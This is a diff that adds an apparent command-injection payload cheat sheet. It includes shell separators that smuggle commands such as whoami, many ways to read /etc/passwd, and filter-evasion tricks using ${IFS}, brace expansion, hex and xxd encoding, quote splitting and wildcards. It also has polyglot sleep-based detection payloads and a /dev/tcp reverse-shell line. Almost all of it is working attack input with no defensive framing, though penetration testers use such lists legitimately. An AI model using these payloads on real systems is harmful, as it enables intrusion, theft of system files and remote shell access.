@@ -1,0 +1,101 @@
+;whoami
+&& whoami
+| whoami
+$(whoami)
+`whoami`
+; sleep 5
+; ls
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+...
+command1; command2   # Execute command1 and then command2
+command1 && command2 # Execute command2 only if command1 succeeds
+command1 || command2 # Execute command2 only if command1 fails
+command1 & command2  # Execute command1 in the background
+command1 | command2  # Pipe the output of command1 into command2
+cat${IFS}/etc/passwd
+ls${IFS}-la
+{cat,/etc/passwd}
+cat</etc/passwd
+sh</dev/tcp/127.0.0.1/4242
+ping%CommonProgramFiles:~10,-18%127.0.0.1
+ping%PROGRAMFILES:~10,-5%127.0.0.1
+$ cat /et\
+c/pa\
+sswd
+cat%20/et%5C%0Ac/pa%5C%0Asswd
+{,ip,a}
+{,ifconfig}
+{,ifconfig,eth0}
+{l,-lh}s
+{,echo,#test}
+{,$"whoami",}
+{,/?s?/?i?/c?t,/e??/p??s??,}
+swissky@crashlab:~$ echo ${HOME:0:1}
+/
+
+swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ echo . | tr '!-0' '"-1'
+/
+
+swissky@crashlab:~$ tr '!-0' '"-1' <<< .
+/
+
+swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+root:x:0:0:root:/root:/bin/bash
+swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+/etc/passwd
+
+swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
+/etc/passwd
+
+swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
+/etc/passwd
+
+swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+root:x:0:0:root:/root:/bin/bash
+w'h'o'am'i
+wh''oami
+'w'hoami
+w"h"o"am"i
+wh""oami
+"wh"oami
+w\ho\am\i
+/\b\i\n/////s\h
+who$()ami
+who$(echo am)i
+who`echo am`i
+/???/??t /???/p??s??
+
+test=/ehhh/hmtc/pahhh/hmsswd
+cat ${test//hhh\/hm/}
+cat ${test//hh??hm/}
+Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+
+# Context inside commands with single and double quote:
+echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+
+# Context inside commands with single and double quote:
+echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
+echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
